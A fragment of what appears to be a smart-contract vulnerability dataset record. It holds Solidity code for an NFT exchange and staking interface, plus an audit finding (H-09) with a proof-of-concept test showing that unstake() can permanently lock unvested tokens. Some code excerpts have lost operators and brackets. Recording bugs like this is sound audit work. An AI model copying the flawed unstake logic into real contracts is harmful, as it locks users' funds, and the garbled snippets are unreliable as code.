isUserOrderNonceExecutedOrCancelled[sell.signer][sell.constraints[5]] = true;\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _execMatchOneToManyOrders(sell.signer, buy.signer, sell.nfts, buy.execParams[1], remainingAmount);\n    _emitMatchEvent(\n      sellOrderHash,\n      buyOrderHash,\n      sell.signer,\n      buy.signer,\n      buy.execParams[0],\n      buy.execParams[1],\n      execPrice\n    );\n    return protocolFee;\n  }\n\n  /// @dev this helper purely exists to help reduce contract size a bit and avoid any stack too deep errors\n  function _execMatchOneToManyOrders(\n    address seller,\n    address buyer,\n    OrderTypes.OrderItem[] calldata constructedNfts,\n    address currency,\n    uint256 amount\n  ) internal {\n    _transferMultipleNFTs(seller, buyer, constructedNfts);\n    // transfer final amount (post-fees) to seller\n    IERC20(currency).safeTransferFrom(buyer, seller, amount);\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers for match orders\n   * @dev Updates order nonce states, does asset transfers, emits events and does gas refunds\n   * @param sellOrderHash sell order hash\n   * @param buyOrderHash buy order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param constructedNfts the constructed nfts\n   * @param startGasPerOrder gas when this order started execution\n   * @param execPrice execution price\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth weth address\n   */\n  function _execMatchOrders(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    OrderTypes.OrderItem[] calldata constructedNfts,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _execMatchOrder(\n      sell.signer,\n      buy.signer,\n      sell.constraints[5],\n      buy.constraints[5],\n      constructedNfts,\n      buy.execParams[1],\n      remainingAmount\n    );\n    _emitMatchEvent(\n      sellOrderHash,\n      buyOrderHash,\n      sell.signer,\n      buy.signer,\n      buy.execParams[0],\n      buy.execParams[1],\n      execPrice\n    );\n    uint256 gasCost = (startGasPerOrder - gasleft() + wethTransferGasUnits) * tx.gasprice;\n    // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n    // else we need to send the protocol fee separately in the execution currency\n    if (buy.execParams[1] == weth) {\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), protocolFee + gasCost);\n    } else {\n      IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, address(this), protocolFee);\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), gasCost);\n    }\n  }\n\n  /// @dev this helper purely exists to help reduce contract size a bit and avoid any stack too deep errors\n  function _execMatchOrder(\n    address seller,\n    address buyer,\n    uint256 sellNonce,\n    uint256 buyNonce,\n    OrderTypes.OrderItem[] calldata constructedNfts,\n    address currency,\n    uint256 amount\n  ) internal {\n    // Update order execution status to true (prevents replay)\n    isUserOrderNonceExecutedOrCancelled[seller][sellNonce] = true;\n    isUserOrderNonceExecutedOrCancelled[buyer][buyNonce] = true;\n    _transferMultipleNFTs(seller, buyer, constructedNfts);\n    // transfer final amount (post-fees) to seller\n    IERC20(currency).safeTransferFrom(buyer, seller, amount);\n  }\n\n  function _emitMatchEvent(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    address seller,\n    address buyer,\n    address complication,\n    address currency,\n    uint256 amount\n  ) internal {\n    emit MatchOrderFulfilled(sellOrderHash, buyOrderHash, seller, buyer, complication, currency, amount);\n  }\n\n  /**\n   * @notice Internal helper function to take orders\n   * @dev verifies whether order can be executed\n   * @param makerOrder the maker order\n   * @param takerItems nfts to be transferred\n   * @param execPrice execution price\n   */\n  function _takeOrders(\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.OrderItem[] calldata takerItems,\n    uint256 execPrice\n  ) internal {\n    bytes32 makerOrderHash = _hash(makerOrder);\n    bool makerOrderValid = isOrderValid(makerOrder, makerOrderHash);\n    bool executionValid = IComplication(makerOrder.execParams[0]).canExecTakeOrder(makerOrder, takerItems);\n    require(makerOrderValid && executionValid, 'order not verified');\n    _execTakeOrders(makerOrderHash, makerOrder, takerItems, makerOrder.isSellOrder, execPrice);\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers \n              for take orders specifying a higher order intent\n   * @dev Updates order nonce state, does asset transfers and emits events\n   * @param makerOrderHash maker order hash\n   * @param makerOrder the maker order\n   * @param takerItems nfts to be transferred\n   * @param isMakerSeller is the maker order a sell order\n   * @param execPrice execution price\n   */\n  function _execTakeOrders(\n    bytes32 makerOrderHash,\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.OrderItem[] calldata takerItems,\n    bool isMakerSeller,\n    uint256 execPrice\n  ) internal {\n    isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n    if (isMakerSeller) {\n      _transferNFTsAndFees(makerOrder.signer, msg.sender, takerItems, execPrice, makerOrder.execParams[1]);\n      _emitTakerEvent(makerOrderHash, makerOrder.signer, msg.sender, makerOrder, execPrice);\n    } else {\n      _transferNFTsAndFees(msg.sender, makerOrder.signer, takerItems, execPrice, makerOrder.execParams[1]);\n      _emitTakerEvent(makerOrderHash, msg.sender, makerOrder.signer, makerOrder, execPrice);\n    }\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers \n              for simple take orders\n   * @dev Updates order nonce state, does asset transfers and emits events\n   * @param makerOrderHash maker order hash\n   * @param makerOrder the maker order\n   * @param isMakerSeller is the maker order a sell order\n   * @param execPrice execution price\n   */\n  function _execTakeOneOrder(\n    bytes32 makerOrderHash,\n    OrderTypes.MakerOrder calldata makerOrder,\n    bool isMakerSeller,\n    uint256 execPrice\n  ) internal {\n    isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n    if (isMakerSeller) {\n      _transferNFTsAndFees(makerOrder.signer, msg.sender, makerOrder.nfts, execPrice, makerOrder.execParams[1]);\n      _emitTakerEvent(makerOrderHash, makerOrder.signer, msg.sender, makerOrder, execPrice);\n    } else {\n      _transferNFTsAndFees(msg.sender, makerOrder.signer, makerOrder.nfts, execPrice, makerOrder.execParams[1]);\n      _emitTakerEvent(makerOrderHash, msg.sender, makerOrder.signer, makerOrder, execPrice);\n    }\n  }\n\n  function _emitTakerEvent(\n    bytes32 orderHash,\n    address seller,\n    address buyer,\n    OrderTypes.MakerOrder calldata order,\n    uint256 amount\n  ) internal {\n    emit TakeOrderFulfilled(orderHash, seller, buyer, order.execParams[0], order.execParams[1], amount);\n  }\n\n  /**\n   * @notice Transfers NFTs and fees\n   * @param seller the seller\n   * @param buyer the buyer\n   * @param nfts nfts to transfer\n   * @param amount amount to transfer\n   * @param currency currency of the transfer\n   */\n  function _transferNFTsAndFees(\n    address seller,\n    address buyer,\n    OrderTypes.OrderItem[] calldata nfts,\n    uint256 amount,\n    address currency\n  ) internal {\n    // transfer NFTs\n    _transferMultipleNFTs(seller, buyer, nfts);\n    // transfer fees\n    _transferFees(seller, buyer, amount, currency);\n  }\n\n  /**\n   * @notice Transfers multiple NFTs in a loop and ERC1155s in a batch\n   * @param from the from address\n   * @param to the to address\n   * @param nfts nfts to transfer\n   */\n  function _transferMultipleNFTs(\n    address from,\n    address to,\n    OrderTypes.OrderItem[] calldata nfts\n  ) internal {\n    uint256 numNfts = nfts.length;\n    for (uint256 i = 0; i < numNfts; ) {\n      _transferNFTs(from, to, nfts[i]);\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n  /**\n   * @notice Transfer NFTs\n   * @param from address of the sender\n   * @param to address of the recipient\n   * @param item item to transfer\n   */\n  function _transferNFTs(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {\n      _transferERC721s(from, to, item);\n    } else if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {\n      _transferERC1155s(from, to, item);\n    }\n  }\n\n  /**\n   * @notice Transfer ERC721s\n   * @param from address of the sender\n   * @param to address of the recipient\n   * @param item item to transfer\n   */\n  function _transferERC721s(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    uint256 numTokens = item.tokens.length;\n    for (uint256 i = 0; i < numTokens; ) {\n      IERC721(item.collection).safeTransferFrom(from, to, item.tokens[i].tokenId);\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n  /**\n   * @notice Transfer ERC1155s\n   * @dev uses the ERC1155 batchTransfer function for efficient transfers\n   * @param from address of the sender\n   * @param to address of the recipient\n   * @param item item to transfer\n   */\n  function _transferERC1155s(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    uint256 numNfts = item.tokens.length;\n    uint256[] memory tokenIdsArr = new uint256[](numNfts);\n    uint256[] memory numTokensPerTokenIdArr = new uint256[](numNfts);\n    for (uint256 i = 0; i < numNfts; ) {\n      tokenIdsArr[i] = item.tokens[i].tokenId;\n      numTokensPerTokenIdArr[i] = item.tokens[i].numTokens;\n      unchecked {\n        ++i;\n      }\n    }\n    IERC1155(item.collection).safeBatchTransferFrom(from, to, tokenIdsArr, numTokensPerTokenIdArr, '0x0');\n  }\n\n  /**\n   * @notice Transfer fees. Fees are always transferred from buyer to the seller and the exchange although seller is \n            the one that actually 'pays' the fees\n   * @dev if the currency ETH, no additional transfer is needed to pay exchange fees since the contract is 'payable'\n   * @param seller the seller\n   * @param buyer the buyer\n   * @param amount amount to transfer\n   * @param currency currency of the transfer\n   */\n  function _transferFees(\n    address seller,\n    address buyer,\n    uint256 amount,\n    address currency\n  ) internal {\n    // protocol fee\n    uint256 protocolFee = (PROTOCOL_FEE_BPS * amount) / 10000;\n    uint256 remainingAmount = amount - protocolFee;\n    // ETH\n    if (currency == address(0)) {\n      // transfer amount to seller\n      (bool sent, ) = seller.call{value: remainingAmount}('');\n      require(sent, 'failed to send ether to seller');\n    } else {\n      // transfer final amount (post-fees) to seller\n      IERC20(currency).safeTransferFrom(buyer, seller, remainingAmount);\n      // send fee to protocol\n      IERC20(currency).safeTransferFrom(buyer, address(this), protocolFee);\n    }\n  }\n\n  // =================================================== UTILS ==================================================================\n\n  /// @dev Gets current order price for orders that vary in price over time (dutch and reverse dutch auctions)\n  function _getCurrentPrice(OrderTypes.MakerOrder calldata order) internal view returns (uint256) {\n    (uint256 startPrice, uint256 endPrice) = (order.constraints[1], order.constraints[2]);\n    uint256 duration = order.constraints[4] - order.constraints[3];\n    uint256 priceDiff = startPrice > endPrice ? startPrice - endPrice : endPrice - startPrice;\n    if (priceDiff == 0 || duration == 0) {\n      return startPrice;\n    }\n    uint256 elapsedTime = block.timestamp - order.constraints[3];\n    uint256 PRECISION = 10**4; // precision for division; similar to bps\n    uint256 portionBps = elapsedTime > duration ? PRECISION : ((elapsedTime * PRECISION) / duration);\n    priceDiff = (priceDiff * portionBps) / PRECISION;\n    return startPrice > endPrice ? startPrice - priceDiff : startPrice + priceDiff;\n  }\n\n  /// @dev hashes the given order with the help of _nftsHash and _tokensHash\n  function _hash(OrderTypes.MakerOrder calldata order) internal pure returns (bytes32) {\n    // keccak256('Order(bool isSellOrder,address signer,uint256[] constraints,OrderItem[] nfts,address[] execParams,bytes extraParams)OrderItem(address collection,TokenInfo[] tokens)TokenInfo(uint256 tokenId,uint256 numTokens)')\n    bytes32 ORDER_HASH = 0x7bcfb5a29031e6b8d34ca1a14dd0a1f5cb11b20f755bb2a31ee3c4b143477e4a;\n    return\n      keccak256(\n        abi.encode(\n          ORDER_HASH,\n          order.isSellOrder,\n          order.signer,\n          keccak256(abi.encodePacked(order.constraints)),\n          _nftsHash(order.nfts),\n          keccak256(abi.encodePacked(order.execParams)),\n          keccak256(order.extraParams)\n        )\n      );\n  }\n\n  function _nftsHash(OrderTypes.OrderItem[] calldata nfts) internal pure returns (bytes32) {\n    // keccak256('OrderItem(address collection,TokenInfo[] tokens)TokenInfo(uint256 tokenId,uint256 numTokens)')\n    bytes32 ORDER_ITEM_HASH = 0xf73f37e9f570369ceaab59cef16249ae1c0ad1afd592d656afac0be6f63b87e0;\n    uint256 numNfts = nfts.length;\n    bytes32[] memory hashes = new bytes32[](numNfts);\n    for (uint256 i = 0; i < numNfts; ) {\n      bytes32 hash = keccak256(abi.encode(ORDER_ITEM_HASH, nfts[i].collection, _tokensHash(nfts[i].tokens)));\n      hashes[i] = hash;\n      unchecked {\n        ++i;\n      }\n    }\n    bytes32 nftsHash = keccak256(abi.encodePacked(hashes));\n    return nftsHash;\n  }\n\n  function _tokensHash(OrderTypes.TokenInfo[] calldata tokens) internal pure returns (bytes32) {\n    // keccak256('TokenInfo(uint256 tokenId,uint256 numTokens)')\n    bytes32 TOKEN_INFO_HASH = 0x88f0bd19d14f8b5d22c0605a15d9fffc285ebc8c86fb21139456d305982906f1;\n    uint256 numTokens = tokens.length;\n    bytes32[] memory hashes = new bytes32[](numTokens);\n    for (uint256 i = 0; i < numTokens; ) {\n      bytes32 hash = keccak256(abi.encode(TOKEN_INFO_HASH, tokens[i].tokenId, tokens[i].numTokens));\n      hashes[i] = hash;\n      unchecked {\n        ++i;\n      }\n    }\n    bytes32 tokensHash = keccak256(abi.encodePacked(hashes));\n    return tokensHash;\n  }\n\n  // ====================================================== ADMIN FUNCTIONS ======================================================\n\n  /// @dev used for rescuing exchange fees paid to the contract in tokens\n  function rescueTokens(\n    address destination,\n    address currency,\n    uint256 amount\n  ) external onlyOwner {\n    IERC20(currency).safeTransfer(destination, amount);\n  }\n\n  /// @dev used for rescuing exchange fees paid to the contract in ETH\n  function rescueETH(address destination) external payable onlyOwner {\n    (bool sent, ) = destination.call{value: msg.value}('');\n    require(sent, 'failed');\n  }\n\n  /// @dev adds a new transaction currency to the exchange\n  function addCurrency(address _currency) external onlyOwner {\n    _currencies.add(_currency);\n  }\n\n  /// @dev adds a new complication to the exchange\n  function addComplication(address _complication) external onlyOwner {\n    _complications.add(_complication);\n  }\n\n  /// @dev removes a transaction currency from the exchange\n  function removeCurrency(address _currency) external onlyOwner {\n    _currencies.remove(_currency);\n  }\n\n  /// @dev removes a complication from the exchange\n  function removeComplication(address _complication) external onlyOwner {\n    _complications.remove(_complication);\n  }\n\n  /// @dev updates auto snipe executor\n  function updateMatchExecutor(address _matchExecutor) external onlyOwner {\n    MATCH_EXECUTOR = _matchExecutor;\n  }\n\n  /// @dev updates the gas units required for WETH transfers\n  function updateWethTranferGas(uint32 _wethTransferGasUnits) external onlyOwner {\n    WETH_TRANSFER_GAS_UNITS = _wethTransferGasUnits;\n    emit NewWethTransferGasUnits(_wethTransferGasUnits);\n  }\n\n  /// @dev updates exchange fees\n  function setProtocolFee(uint16 _protocolFeeBps) external onlyOwner {\n    PROTOCOL_FEE_BPS = _protocolFeeBps;\n    emit NewProtocolFee(_protocolFeeBps);\n  }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.14;\n\nimport {OrderTypes} from '../libs/OrderTypes.sol';\n\nenum Duration {\n  NONE,\n  THREE_MONTHS,\n  SIX_MONTHS,\n  TWELVE_MONTHS\n}\n\nenum StakeLevel {\n  NONE,\n  BRONZE,\n  SILVER,\n  GOLD,\n  PLATINUM\n}\n\n/**\n * @title IStaker\n * @author nneverlander. Twitter @nneverlander\n * @notice Infinity token staker interface\n */\ninterface IStaker {\n  function stake(\n    uint256 amount,\n    Duration duration\n  ) external;\n\n  function changeDuration(\n    uint256 amount,\n    Duration oldDuration,\n    Duration newDuration\n  ) external;\n\n  function unstake(uint256 amount) external;\n\n  function rageQuit() external;\n\n  function getUserTotalStaked(address user) external view returns (uint256);\n\n  function getUserTotalVested(address user) external view returns (uint256);\n\n  function getRageQuitAmounts(address user) external view returns (uint256, uint256);\n\n  function getUserStakePower(address user) external view returns (uint256);\n\n  function getUserStakeLevel(address user) external view returns (StakeLevel);\n}\n\n\n",
        "CodeNames": [
            "InfinityStaker.sol",
            "InfinityExchange.sol",
            "IStaker.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-09",
                "Location": [
                    "js\n  describe('should cause trouble', () = {\n    it('should lock up funds', async function () {\n      await approveERC20(signer1.address, token.address, amountStaked, signer1, infinityStaker.address);\n      await infinityStaker.connect(signer1).stake(amountStaked, 2);\n      await network.provider.send(\"evm_increaseTime\", 181 * DAY]);\n      await network.provider.send('evm_mine', ]);\n      \n      // The funds we staked for 6 months have vested\n      expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(amountStaked);\n\n      // Now we want to stake funds for three months\n      await approveERC20(signer1.address, token.address, amountStaked2, signer1, infinityStaker.address);\n      await infinityStaker.connect(signer1).stake(amountStaked2, 1);\n\n      // total staked is now the funds staked for three & six months\n      // total vested stays the same\n      expect(await infinityStaker.getUserTotalStaked(signer1.address)).to.eq(amountStaked.add(amountStaked2));\n      expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(amountStaked);\n\n      // we unstake the funds that are already vested.\n      const userBalanceBefore = await token.balanceOf(signer1.address);\n      await infinityStaker.connect(signer1).unstake(amountStaked);\n      const userBalanceAfter = await token.balanceOf(signer1.address);\n\n      expect(userBalanceAfter).to.eq(userBalanceBefore.add(amountStaked));\n\n      expect(await infinityStaker.getUserTotalStaked(signer1.address)).to.eq(ethers.BigNumber.from(0));\n      expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(ethers.BigNumber.from(0));\n    });\n  });\n",
                    "sol\n    if (amount  noVesting) {\n      userstakedAmounts[user][Duration.NONE].amount = 0;\n      userstakedAmounts[user][Duration.NONE].timestamp = 0;\n      amount = amount noVesting;\n      if (amount  vestedThreeMonths) {\n        // MAIN ISSUE:\n        // here `vestedThreeMonths` is 0. The current staked tokens are set to `0` and `amount` is decreased by `0`.\n        // Since `vestedThreeMonths` is `0` we shouldn't decrease `userstakedAmounts` at all here.\n        userstakedAmounts[user][Duration.THREE_MONTHS].amount = 0;\n        userstakedAmounts[user][Duration.THREE_MONTHS].timestamp = 0;\n        amount = amount vestedThreeMonths;\n        // `amount == vestedSixMonths` so we enter the else block\n        if (amount  vestedSixMonths) {\n          userstakedAmounts[user][Duration.SIX_MONTHS].amount = 0;\n          userstakedAmounts[user][Duration.SIX_MONTHS].timestamp = 0;\n          amount = amount vestedSixMonths;\n          if (amount  vestedTwelveMonths) {\n            userstakedAmounts[user][Duration.TWELVE_MONTHS].amount = 0;\n            userstakedAmounts[user][Duration.TWELVE_MONTHS].timestamp = 0;\n          } else {\n            userstakedAmounts[user][Duration.TWELVE_MONTHS].amount -= amount;\n          }\n        } else {\n          // the staked amount is set to `0`.\n          userstakedAmounts[user][Duration.SIX_MONTHS].amount -= amount;\n        }\n      } else {\n        userstakedAmounts[user][Duration.THREE_MONTHS].amount -= amount;\n      }\n    } else {\n      userstakedAmounts[user][Duration.NONE].amount -= amount;\n    }\n"
                ],
                "Type": " Calling  unstake()  can cause locked funds",
                "Description": "\nFollowing scenario:\n\nAlice has staked X token for 6 months that have vested. She stakes Y tokens for another three months. If she now calls unstake(X) to take out the tokens that have vested, the Y tokens she staked for three months will be locked up.\n\n\nFirst, here's a test showcasing the issue:\n\njs\n  describe('should cause trouble', () = {\n    it('should lock up funds', async function () {\n      await approveERC20(signer1.address, token.address, amountStaked, signer1, infinityStaker.address);\n      await infinityStaker.connect(signer1).stake(amountStaked, 2);\n      await network.provider.send(\"evm_increaseTime\", 181 * DAY]);\n      await network.provider.send('evm_mine', ]);\n      \n      // The funds we staked for 6 months have vested\n      expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(amountStaked);\n\n      // Now we want to stake funds for three months\n      await approveERC20(signer1.address, token.address, amountStaked2, signer1, infinityStaker.address);\n      await infinityStaker.connect(signer1).stake(amountStaked2, 1);\n\n      // total staked is now the funds staked for three & six months\n      // total vested stays the same\n      expect(await infinityStaker.getUserTotalStaked(signer1.address)).to.eq(amountStaked.add(amountStaked2));\n      expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(amountStaked);\n\n      // we unstake the funds that are already vested.\n      const userBalanceBefore = await token.balanceOf(signer1.address);\n      await infinityStaker.connect(signer1).unstake(amountStaked);\n      const userBalanceAfter = await token.balanceOf(signer1.address);\n\n      expect(userBalanceAfter).to.eq(userBalanceBefore.add(amountStaked));\n\n      expect(await infinityStaker.getUserTotalStaked(signer1.address)).to.eq(ethers.BigNumber.from(0));\n      expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(ethers.BigNumber.from(0));\n    });\n  });\n\n\nThe test implements the scenario I've described above. In the end, the user got back their amountStaked tokens with the amountStaked2 tokens being locked up in the contract. The user has no tokens staked at the end.\n\nThe issue is in the _updateUserStakedAmounts() function:\n\nsol\n    if (amount  noVesting) {\n      userstakedAmounts[user][Duration.NONE].amount = 0;\n      userstakedAmounts[user][Duration.NONE].timestamp = 0;\n      amount = amount noVesting;\n      if (amount  vestedThreeMonths) {\n        // MAIN ISSUE:\n        // here vestedThreeMonths is 0. The current staked tokens are set to 0 and amount is decreased by 0.\n        // Since vestedThreeMonths is 0 we shouldn't decrease userstakedAmounts at all here.\n        userstakedAmounts[user][Duration.THREE_MONTHS].amount = 0;\n        userstakedAmounts[user][Duration.THREE_MONTHS].timestamp = 0;\n        amount = amount vestedThreeMonths;\n        // amount == vestedSixMonths so we enter the else block\n        if (amount  vestedSixMonths) {\n          userstakedAmounts[user][Duration.SIX_MONTHS].amount = 0;\n          userstakedAmounts[user][Duration.SIX_MONTHS].timestamp = 0;\n          amount = amount vestedSixMonths;\n          if (amount  vestedTwelveMonths) {\n            userstakedAmounts[user][Duration.TWELVE_MONTHS].amount = 0;\n            userstakedAmounts[user][Duration.TWELVE_MONTHS].timestamp = 0;\n          } else {\n            userstakedAmounts[user][Duration.TWELVE_MONTHS].amount -= amount;\n          }\n        } else {\n          // the staked amount is set to 0.\n          userstakedAmounts[user][Duration.SIX_MONTHS].amount -= amount;\n        }\n      } else {\n        userstakedAmounts[user][Duration.THREE_MONTHS].amount -= amount;\n      }\n    } else {\n      userstakedAmounts[user][Duration.NONE].amount -= amount;\n    }\n\n\n",
                "Repair": "\nDon't set userstakedAmounts.amount to 0 if none of its tokens are removed (vestedAmount == 0)\n\nnneverlander (Infinity) confirmed(https://github.com/code-423n4/2022-06-infinity-findings/issues/50#issuecomment-1163063584)\n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-06-infinity-findings/issues/50#issuecomment-1179743567):\n  When unstaking, unvested tokens may become locked in the contract forever.\n \n Accepting this as a High risk issue.\n\n\n\n*\n\n\n"
            }
        ]
    }
]